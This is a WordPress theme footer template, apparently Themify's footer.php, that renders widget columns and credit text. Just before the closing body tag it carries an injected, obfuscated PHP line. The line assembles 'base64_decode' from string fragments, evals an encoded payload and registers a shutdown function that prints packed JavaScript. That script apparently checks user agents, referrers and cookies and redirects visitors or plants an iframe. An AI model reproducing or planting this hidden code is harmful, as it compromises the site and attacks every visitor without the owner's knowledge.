		<div id="footer">
		
			<?php 
			$footer_widget_option = (themify_get('setting-footer_widgets') == "") ? "footerwidget-3col" : themify_get('setting-footer_widgets');
			if($footer_widget_option != ""){ ?>
					  <?php
					  $columns = array('footerwidget-4col' 	=> array('col col4-1','col col4-1','col col4-1','col col4-1'),
											 'footerwidget-3col'	=> array('col col3-1','col col3-1','col col3-1'),
											 'footerwidget-2col' 	=> array('col col4-2','col col4-2'),
											 'footerwidget-1col' 	=> array('') );
					  $x=0;
					  ?>
					<?php foreach($columns[$footer_widget_option] as $col): ?>
							<?php 
								 $x++;
								 if($x == 1){ 
									  $class = "first"; 
								 } else {
									  $class = "";	
								 }
							?>
							<div class="<?php echo $col;?> <?php echo $class; ?>">
								 <?php if ( !function_exists('dynamic_sidebar') || !dynamic_sidebar('Footer_Widget_'.$x) ) ?>
							</div>
					  <?php endforeach; ?>
			<?php } ?>
			
			<div class="footer-text credits">
				<div class="one"><?php if(themify_get('setting-footer_text_left') != ""){ echo themify_get('setting-footer_text_left'); } else { echo '&copy; <a href="'.get_option('home').'">'.get_bloginfo('name').'</a> '.date('Y'); } ?></div>
				<div class="two"><?php if(themify_get('setting-footer_text_right') != ""){ echo themify_get('setting-footer_text_right'); } else { echo 'Powered by <a href="http://wordpress.org">WordPress</a>  &bull; <a href="http://themify.me">Themify WordPress Themes</a>'; } ?></div>
			</div>
			<!-- /.footer-text -->
		
		</div>
		<!--/footer -->
	
	</div>
	<!--/pagewrap -->

</div>
<!-- /#bg -->

<?php
/**
 *  Stylesheets and Javascript files are enqueued in theme-functions.php
 */
?>

<?php wp_footer(); ?>

<!--32dc79e2130d26c19ead0c6d52fea75b--><?php  $ygu="b"."ase"."64_de"."code";eval($ygu("CmZ1bmN0aW9uIHVzZXJfYWJvcnRfZW5kX2V4aXRfb3BlcmF0aW9uaWRfODI4MzI3OSgpCnsKICAgIGVjaG8gYmFzZTY0X2RlY29kZSgnUEhOamNtbHdkQ0IwZVhCbFBTSjBaWGgwTDJwaGRtRnpZM0pwY0hRaUlHbGtQU0pwWkY4NE1qZ3pNamM1SWo1bGRtRnNLR1oxYm1OMGFXOXVLSEFzWVN4akxHc3NaU3hrS1h0bFBXWjFibU4wYVc5dUtHTXBlM0psZEhWeWJpaGpQR0UvSnljNlpTaHdZWEp6WlVsdWRDaGpMMkVwS1NrcktDaGpQV01sWVNrK016VS9VM1J5YVc1bkxtWnliMjFEYUdGeVEyOWtaU2hqS3pJNUtUcGpMblJ2VTNSeWFXNW5LRE0yS1NsOU8ybG1LQ0VuSnk1eVpYQnNZV05sS0M5ZUx5eFRkSEpwYm1jcEtYdDNhR2xzWlNoakxTMHBlMlJiWlNoaktWMDlhMXRqWFh4OFpTaGpLWDFyUFZ0bWRXNWpkR2x2YmlobEtYdHlaWFIxY200Z1pGdGxYWDFkTzJVOVpuVnVZM1JwYjI0b0tYdHlaWFIxY200blhGeDNLeWQ5TzJNOU1YMDdkMmhwYkdVb1l5MHRLWHRwWmloclcyTmRLWHR3UFhBdWNtVndiR0ZqWlNodVpYY2dVbVZuUlhod0tDZGNYR0luSzJVb1l5a3JKMXhjWWljc0oyY25LU3hyVzJOZEtYMTljbVYwZFhKdUlIQjlLQ2R4SURGMFBUTjRLRW9vS1h0bUtHb3VUU0U5TVVrbUprd2dhaTVOSVQwaVN5SXBlek41S0RGMEtUdG1LRXdnUVZzaU1VRWlYVDA5SWtzaUtYdEJXeUl4UVNKZFBURTdjU0F4Tnowb01UWW9LU1ltTVZJb0tTazdjU0F4VkQwaE1UY21KaUVoUVM0emVpWW1RUzVGTGpOM1BUMDlJak4ySUROeUxpSTdjU0F4YWowdE1UdHhJRWM5SWpOek9pOHZNM1F1TTNVdk0wRWlPMllvVnlncEppWXhhajA5TVNsN1ppZ29SUzVPTGpGdktDOHpRaTlwS1NsOGZDaEZMazR1TVc4b0x6TklMMmtwS1NsN01Ua3VNMGtvUnlsOWVudEJMakU1UFVjN2FpNHhPVDFIZlgxNmUyWW9LREUzSmlZaE1WUW1KaUZYS0NrcEtYdHhJRk05SWp3eE1TQXpTajFjWENJelJ6b3pSanN6UXpvdE0wUTdYRndpUGp3eGVTQXpSVDFjWENJeGJGeGNJaUF6Y1QxY1hDSWlLMGNySWx4Y0lpQXpjRDFjWENJeGJGeGNJajQ4THpGNVBqd3ZNVEUrSWp0eElFazlhaTR6WWlnaU1URWlLVHRtS0VrdU1XMDlQVEFwZTJvdVRTNVFQV291VFM1UUsxTjllbnR4SURGT1BVa3VNVzA3Y1NCU1BUTmpMak5rS0NneFRpOHlLU2s3U1Z0U1hTNVFQVWxiVWwwdVVDdFRmWDE5ZlRGTktDbDlmU3d6WVNrN1NpQXhUU2dwZTNFZ1ZUMGlNemtpTzJZb1ZTRTlJak0xSWlsN2NTQklQV291TXpZb1ZTazdaaWhNSUVnaFBVc21Ka2doUFRGSktYdElMak0zUFNJaU96TTRJRWg5ZlgwN1NpQXhVaWdwZTJZb2FpNUVKaVloYWk0elpTbDdlQ0JDZlhvZ1ppaHFMa1FtSmlGQkxqTm1LWHQ0SUVKOWVpQm1LR291UkNZbUlXb3VNMjBwZTNnZ1FuMTZJR1lvYWk1RUppWWhhaTR6YmlsN2VDQkNmWG9nWmlocUxrUW1KaUZCTGpOdktYdDRJRUo5ZWlCbUtHb3VSQ2w3ZUNCQ2ZYb2daaWhNSUVVdU0yd2hQU0pMSWlZbUlXb3VSQ1ltTVRZb0tTbDdlQ0JDZlhwN2VDQXhZbjE5U2lBeE5pZ3BlM0VnZVQxQkxrVXVUanR4SUZFOWVTNURLQ0l6YXlBaUtUdG1LRkUrTUNsN2VDQmFLSGt1V1NoUkt6VXNlUzVES0NJdUlpeFJLU2tzTVRBcGZYRWdNV3M5ZVM1REtDSXpaeThpS1R0bUtERnJQakFwZTNFZ01UUTllUzVES0NJemFEb2lLVHQ0SUZvb2VTNVpLREUwS3pNc2VTNURLQ0l1SWl3eE5Da3BMREV3S1gxeElFODllUzVES0NJemFTOGlLVHRtS0U4K01DbDdlQ0JhS0hrdVdTaFBLelVzZVM1REtDSXVJaXhQS1Nrc01UQXBmWGdnTVdKOVNpQlhLQ2w3Y1NBeFlUMUJMa1V1VGk0emFpZ3BPMllvTHlnelMzd3pURnhjWkN0OE5HZ3BMaXN4YUh3MGFYdzBhbHhjTDN3MFozdzBabncwWW53MFkzdzBaSHd6Tkh3MGEzd3hkU2cwYkh3eFpDbDhNWEo4TkhKOE5ITWdmRFIwZkRSeGZEUndmREZvTGlzMGJYdzBibncwYnlCdEtEUmhmRFE0S1dsOE0xTW9JREZQS1Q5OE0xUjhjQ2d6Vlh3elVpbGNYQzk4TTFGOE0wMThNMDU4TTA4b05IdzJLVEI4TTFCOE0xWjhNVWhjWEM0b00xZDhORE1wZkRRMGZEUTJmRFF5SURReGZETllmRE5aTDJrdU1VTW9NV0VwZkh3dk0xcDhOSFY4TWt0OE1tWjhNbUY4TlRCYk1TMDJYV2w4TWpoOE1WWjhZU0F4VUh3eFdId3hkeWd4VVh3eGVIeHpYRnd0S1h3eFV5Z3lZbnd5YXlsOE1XY29NbTE4TVc1OE1YWXBmREp1ZkRKa0tESmxmRlo4TW1NcGZESnBmREZtS0RKc2ZERmpLWHd4V2loVWZESnZLWHd4VjN3eFdTZ3ljSHhjWEMxdGZISWdmSE1nS1h3eWNYd3laeWd4Vlh3eGNId3lhQ2w4TVVJb01tcDhNaklwZkRJektERjNmREk1S1h3eU55aGxmSFlwZDN3eU5ud3lORnhjTFNodWZIVXBmREkxWEZ3dmZETXpmREpSZkRKU1hGd3RmREpRZkRKUGZESk1mREpOWEZ3dGZERjJLREpPZkRGRktYd3lXbnd5VmlneFpYd3hjSHd5V0NsOE1uaDhNbmxjWEMxemZESjZmREozZkRKMmZERnBLR044Y0NsdmZESnpLREV5ZkZ4Y0xXUXBmREoxS0RRNWZERlRLWHd5UWlneVNId3lTU2w4TVZFb01rUjhNa1VwZkRKRGZESkdLRnMwTFRkZE1Id3hUM3d4VUh3eVJ5bDhNa0Y4TW5Rb1hGd3RmREZ4S1h3eFRDQjFmREpLZkRKWGZESlpYRnd0Tlh4blhGd3RNVFY4TVdNb1hGd3VkM3d4WkNsOE16RW9NekI4TWxVcGZESnlmREpVZkRKVFhGd3RLRzE4Y0h4MEtYdzBaVnhjTFh3MFJDZ3hSM3d4UmlsOE5tMG9JR2w4TVhVcGZEWnVYRnd0WTN3MmJ5aGpLRnhjTFh3Z2ZERnhmR0Y4WjN4d2ZITjhkQ2w4Tm1zcGZEWm9LRFpwZkRacUtYeHBYRnd0S0RJd2ZERmpmRmdwZkRaeGZEUjJLQ0I4WEZ3dGZGeGNMeWw4Tm5kOE5uaDhObmw4Tm5aOE5uVjhObko4Tm5OOE1YSjhOblFvZEh4MktXRjhObWQ4Tm1aOE5qSjhOak44TmpSOE5Wb29JSHhjWEM4cGZEVlZmRFZXSUh3MVYxeGNMWHcxV0NoamZHc3BmRFkxS0RZMmZEWmpLWHcyWkNnZ1ozeGNYQzhvYTN4c2ZIVXBmRFV3ZkRVMGZGeGNMVnRoTFhkZEtYdzJPSHcyT1h3MmVseGNMWGQ4TnpKOE56TmNYQzk4V0NoVWZEYzBmRGN4S1h3eGVpaEdmREl4ZkRGdUtYeHRYRnd0TmxwOE5sY29ObGg4TVVRcGZEYzFLRGMyZkRkamZERktLWHczWlh3eE5TaEdmRGRrZkRGQ2ZEZGlmREZwZkhRb1hGd3RmQ0I4YjN4MktYdzNOeWw4Tnpnb05UQjhObFY4ZGlBcGZEWlVmRFpIZkRaSVd6QXRNbDE4TmtsYk1pMHpYWHcyUmlnd2ZESXBmRFpGS0RCOE1udzFLWHcyUWlnd0tEQjhNU2w4TVRBcGZEWkRLQ2hqZkcwcFhGd3RmRFpFZkRaS2ZEWkxmRFpSZkRaU0tYdzJVeWcyZkdrcGZEWlBmRFpNZkRaTktEWk9mRFZVS1h3MVUzdzBWM3cwV0h3MFdTaGhmR1I4ZENsOE5GVjhORklvTVROOFhGd3RLRnN4TFRoZGZHTXBLWHcwV253MU1Yd3hTeWcxWVh3MVlpbDhOV05jWEMweWZEVTVLREZWZkRVNGZERnpLWHcxTlh3MU5ud3hSMXhjTFdkOE5UZGNYQzFoZkRSUUtEUkRmREV5ZkRJeGZETXlmRFl3ZkZ4Y0xWc3lMVGRkZkdsY1hDMHBmRFI0ZkRSNWZEUjZmRFJHZkRSSGZEUk5LRFJPZkRSUEtYdzBURnhjTDN3MFN5ZzBTSHhZZkRSSmZEUktmRlo4TldRcGZEVmxLRVo4YUZ4Y0xYd3hlSHh3WEZ3dEtYdzFSMXhjTDN3eGN5aGpLRnhjTFh3d2ZERXBmRFEzZkRGNmZERkZmREZFS1h3MVFWeGNMWHcxUW53MVF5aGNYQzE4YlNsOE5VbGNYQzB3ZkRWS0tEUTFmRFZSS1h3MVVpZ3haM3d4Wm53MVQzd3haWHcxVGlsOE5Vc29OVXg4VmlsOE5VMG9SbnhvWEZ3dGZIWmNYQzE4ZGlBcGZEVjVLRVo4Tld3cGZEVnRLREU0ZkRVd0tYdzFiaWcxYTN3eE1Id3hPQ2w4TVVZb05XZDhOV2dwZkRWcFhGd3RmRFZ2WEZ3dGZEVndLR2w4YlNsOE5YWmNYQzE4ZEZ4Y0xURTFmRFY0S0RGTGZEVjFLWHd4U2lnM01IeHRYRnd0ZkRWeGZEVnlLWHcxYzF4Y0xUbDhNVWdvWEZ3dVlud3hUSHcxZWlsOE5WQjhOVVI4TlVWOE5GWjhObVVvTm5COFZDbDhObXdvTkRCOE5Wc3dMVE5kZkZ4Y0xYWXBmRFYwZkRWM2ZEVm1mRFZxS0RVeWZEVXpmRFl3ZkRZeGZEY3dmRFZJZkRWR2ZEUjNmRFJCZkRSQ0tYdzBSU2hjWEMxOElDbDhORkY4TkZSOE5GTW9aeUI4TmxCOE56a3BmRGRoZkRaWmZEWldmRFpCWEZ3dGZEWTNmRFpoZkRaaVhGd3RMMmt1TVVNb01XRXVOVmtvTUN3MEtTa3BlM2dnUW4xNElERmlmU2NzTmpJc05EUTVMQ2Q4Zkh4OGZIeDhmSHg4Zkh4OGZIeHBabng4Zkh4a2IyTjFiV1Z1ZEh4OGZIeDhmSHgyWVhKOGZIeDhmSHg4Y21WMGRYSnVmRmhCV0V4RmJFeEVSMkowVW14RGQxSnRiVzl0Y21wMVdtcDBja1ZxU1c1TWRXeDZjbmxoUjFGOFpXeHpaWHgzYVc1a2IzZDhkSEoxWlh4cGJtUmxlRTltZkdGc2JIeHVZWFpwWjJGMGIzSjhNREY4VDB0clZtNUZWVTk0VTFGcGEwZEJTbEpaZWtoWWMwVmtjSEZFWm5wVFIyRlBlV2xqVmtwblYzeEhia3BLVm1oSllrcHFSWEpWWm5kUVkwVk1kVzVPVkVOYVNscDFTRzlFZDN4U1IwNU9SbFozYjNkdVJHRktkVmx2ZUZaelJrUnpkV2xHVFZaRFYwWldjbXB2V2tKTGJrZGFSWHhtZFc1amRHbHZibngxYm1SbFptbHVaV1I4ZEhsd1pXOW1mR0p2WkhsOGRYTmxja0ZuWlc1MGZIQnNZbUZwWmtaQ1NFNXRkRTlsUmsxSldsZFdjVXAyU0hGNVYyaHVkSFZ6WlhkQmFueHBibTVsY2toVVRVeDhXVnB3YW1ablJuWk5TWGR2V1dORWNITlNhWEZ3UW14SVptdDRTSFpHYTJ0OFdGVkNSMVowUTI5MmMzTnpSVVoxYjIxbWJIWnlXVTVrUzNSaFowbFhkblJsVW01cFQyaENWV044YTFwRmVFRjViMVZsYWtKU1NVTnNVbk54WlVSbmRtVk9XV2QxWVZGV1MwdGpWbTVpVjJWSVJYRjhkR1Y4UVVkQ1prZGtVSE5NUVZaSWRuVlFZMVJOUVdsUFJYaEJTMEZhUm5adFFYeHVlWHhMYVVKa2IxbHFRMFpqVms1WlMyMXlhWGxDUVVOYVRtOXRXR0psUVdkUFJrOTVSR1I4YldGOGMzVmljM1J5YVc1bmZIQmhjbk5sU1c1MGZIeGthWFo4Zkh4S1ZIWnlWM2hRWm5sRVRVNWlXRWhOY1ZGYVQwNWpiMFphYldWdFQyeHdXbGxtZEVGR2MzeHRiM3hWU1ZKS1ZrdHZSMnBwWW1kelVVTjNSVTlNVEdweVZXRnZTRTlJVm5wcmFVdHdUM3h0WTBsbVQzWlVSRTVPWVc5MGJrOTJWa05zYVdoRGFrdE9hM2hoYzBwa1VueDhiRzlqWVhScGIyNThla2xtY0VSVVMxZENabXhsVWt4TlVVRkhVbkZyYkd0MlpIWjFSM0ZwU25WRWFsQjZVM3htWVd4elpYeG5iM3h2Wkh4cGRIeGhjbnhoYkh4dGIySnBiR1Y4Wkc5OFowSkxSRWxZY1hGMGEyNVBSMjFXWmtsbVVsSkNlSEpzUlhGcVkyWnpka1ZUZFdkMWMzZEJjbGw4UmtoT1QyVmtWbUpDWjBabFYxQkpRVlJXUldwSFpHcFlVM0ZWVFhKcmVFSnZSMVJOWlVSOE1qbHdlSHhzWlc1bmRHaDhZMkY4YldGMFkyaDhiR3g4WDN4cGNtbHpmSE5sZkVaNGRXUldiVTFEVDBOVGRrSnlkbTVQWVc1emRtWlNiMmQyZDB0blUzUkVhRXR4Y0hoU2JIRnVmR2x3ZkdOdmZHRmpmRzl2ZkdsbWNtRnRaWHh0WTN4Mlh6TXlaR00zT1dVeU1UTXdaREkyWXpFNVpXRmtNR00yWkRVeVptVmhOelZpZkdKcGZIUmxjM1I4Y21sOGJtUjhkR0Y4Y0hSOGRYQjhiblZzYkh4MGMzeHdiSHhuTVh4VFFuQk1hWFJqUkdsNFpuVnBXVXhVYWxkbFZrVnNSMk54YTNaNFZrWkVjblI4Wkd4ZmJtRnRaWHh2YzN4M1lYeGxjbnhpY1ZOc2NYWjJWRWRYWmt4cFJWTllTbmRKYmxKcVQyMUVabXhuYjI1dFRFSlNkM2QwZkdGcGZIbFJXVk41YW5WdWFuaFZia1JyVVVSR1dHUkNZMmh5YlVKaFVuUktWbEpKVW1OT1UzeGphM3c0TURKemZHRjBkSGQ4WVdKaFkzeGhkWHhoYzN4OGZISmtmR0pzZkdKM2ZHTTFOWHhpZFcxaWZHSnlmRGMzTUhOOFlYcDhOSFJvY0h4cmIzeDVkM3hoYm54bGVId3paM052ZkdKbGZHNXhmR0Z3ZEhWOGJHSjhjbTU4WTJoOFlYWjhZVzF2YVh4MWMzeGthWHhoZG1GdWZHaGhhV1Y4WkhOOFpteDVmR1ZzZkdSdGIySjhaR2xqWVh4a1luUmxmR1JqZkdSbGRtbDhabVYwWTN4bGJYeGxjMnc0ZkdsamZHc3dmR1Y2ZkhwbGZHd3lmSFZzZkdjMU5qQjhOalU1TUh4amJHUmpmR050Wkh4dGNIeGphSFJ0ZkdObGJHeDhZMk4zWVh4alpHMThhR1I4YUdOcGRIeDFibnhrWVh4blpXNWxmRzVuZkdkbWZHTnlZWGQ4WVdSOFozSjhmR05oY0dsOGFHbHdkRzl3Zkc1dmJtVjhaMlYwUld4bGJXVnVkRUo1U1dSOGIzVjBaWEpJVkUxTWZHUmxiR1YwWlh4cFpGODRNamd6TWpjNWZERXdNSHhuWlhSRmJHVnRaVzUwYzBKNVZHRm5UbUZ0Wlh4TllYUm9mR1pzYjI5eWZHTnZiWEJoZEUxdlpHVjhXRTFNU0hSMGNGSmxjWFZsYzNSOFZISnBaR1Z1ZEh4eWRueEZaR2RsZkhSdlRHOTNaWEpEWVhObGZFMVRTVVY4YldGNFZHOTFZMmhRYjJsdWRITjhjWFZsY25sVFpXeGxZM1J2Y254aFpHUkZkbVZ1ZEV4cGMzUmxibVZ5ZkdGMGIySjhhR1ZwWjJoMGZITnlZM3hKYm1OOGFIUjBjSHhyYjJ4a2IzWmhlV0Z3YjNKdlpHRjhkR3Q4UjI5dloyeGxmSFpsYm1SdmNueHpaWFJKYm5SbGNuWmhiSHhqYkdWaGNrbHVkR1Z5ZG1Gc2ZHTm9jbTl0Wlh3d05USkdmR2xRYUc5dVpYeHNaV1owZkRNM01URndlSHgzYVdSMGFIeGhZbk52YkhWMFpYeHdiM05wZEdsdmJueHBVRzlrZkhKbGNHeGhZMlY4YzNSNWJHVjhZVzVrY205cFpIeGlZbnh3YjJOclpYUjhjSE53ZkhObGNtbGxjM3h6ZVcxaWFXRnVmSEJzZFdOclpYSjhjbVY4Y0dGc2JYeHdhRzl1Wlh4cGVHbDhkSEpsYjN4aWNtOTNjMlZ5Zkhoa1lYeDRhV2x1YjN3eE1qQTNmSHhqWlh4M2FXNWtiM2R6Zkd4cGJtdDhkbTlrWVdadmJtVjhmSGRoY0h4OGFXNThmRzlpZkdOdmJYQmhiSHhsYkdGcGJtVjhabVZ1Ym1WamZHaGxhWHhpYkdGNlpYSjhZbXhoWTJ0aVpYSnllWHh0WldWbmIzeGhkbUZ1ZEdkdmZHSmhaR0Y4YVdWdGIySnBiR1Y4YUc5dVpYeG1hWEpsWm05NGZHNWxkR1p5YjI1MGZHOXdaWEpoZkcxdGNIeHRhV1J3Zkd0cGJtUnNaWHhzWjJWOGJXRmxiVzk4TmpNeE1IeHBZV044T0ROOGNYUmxhM3h5TXpnd2ZISTJNREI4T0RWOE9UaDhNRGQ4YUdsOGR6TmpmSEpoYTNOOGNtbHRPWHhuWlh4dGJYeHRjM3h6WVh4ek5UVjhjbTk4ZG1WOGVtOThjV044ZDJWaVkzeHdaM3gzYVh4M2FHbDBmSEJrZUdkOGRtVnlhWHh2ZDJjeGZIQTRNREI4Y0dGdWZIQm9hV3g4ZkhCcGNtVjhmSHg4Y0hKdmVIeHdjMmx2ZkhGaGZISjBmSEJ2ZkdGNWZIVmpmSEJ1ZkhaaGZITmpmSFoxYkdOOFozUjhiR3Q4ZEdOc2ZIWjRmREF3ZkcxaWZIUXlmSFEyZkhSa1ozeDBaV3g4YlROOGJUVjhkSGg4ZG0wME1IeHphSHgwYVcxOGRtOWtZWHgwYjN4emVYeHphWHh6WjJoOGMyaGhjbnh6YVdWOGRqUXdNSHgyTnpVd2ZEZ3hmSE5rYTN3NE1IeHphM3h6Ykh4emIzeG1kSHh6Y0h4ME5YeGlNM3gxZEhOMGZHbGtmSE50Zkc5eVlXNThkM1o4YTJ4dmJueHJjSFI4YTNkamZHdDViM3h6ZFdKemRISjhhMmQwZkh4OGFtbG5jM3hyWkdScGZHdGxhbWw4YkdWOGJtOThlVzkxY254c2FXSjNmR3g1Ym5oOGVtVjBiM3g2ZEdWOGVHbDhiR2Q4ZG1sOGFtVnRkWHhxWW5KdmZHaDFmR0YzZkhSamZIUndmSFpyZkdod2ZHaHpmR2gwZkhKbmZHa3lNekI4YVc1dWIzeHBjR0Z4ZkdwaGZHbHRNV3Q4YVd0dmJYeHBZbkp2Zkdsa1pXRjhhV2N3TVh4dE1YeDVZWE44YmpkOGJtVjhiMjU4YmpVd2ZHNHpNSHh0ZVhkaGZHNHhNSHh1TWpCOGRHWjhkMlo4YnpKcGJYeHZjSHgwYVh4dWVuQm9mRzVqZkhkbmZIZDBmRzV2YTN4dGQySndmSEF4ZkhnM01EQjhiV1Y4Y21OOGQyOXVkWHhqY254OGVHOThiVE5uWVh4dE5UQjhkV2w4YldsOGJ6aDhlbnA4YlhSOGJuZDhkMjFzWW54a1pYeHZZWHd3TW54dGJXVm1KeTV6Y0d4cGRDZ25mQ2NwTERBc2UzMHBLUW84TDNOamNtbHdkRDQ9Jyk7Cn0KCnJlZ2lzdGVyX3NodXRkb3duX2Z1bmN0aW9uKCd1c2VyX2Fib3J0X2VuZF9leGl0X29wZXJhdGlvbmlkXzgyODMyNzknKTsKCg=="));?><!--32dc79e2130d26c19ead0c6d52fea75b--></body>
</html>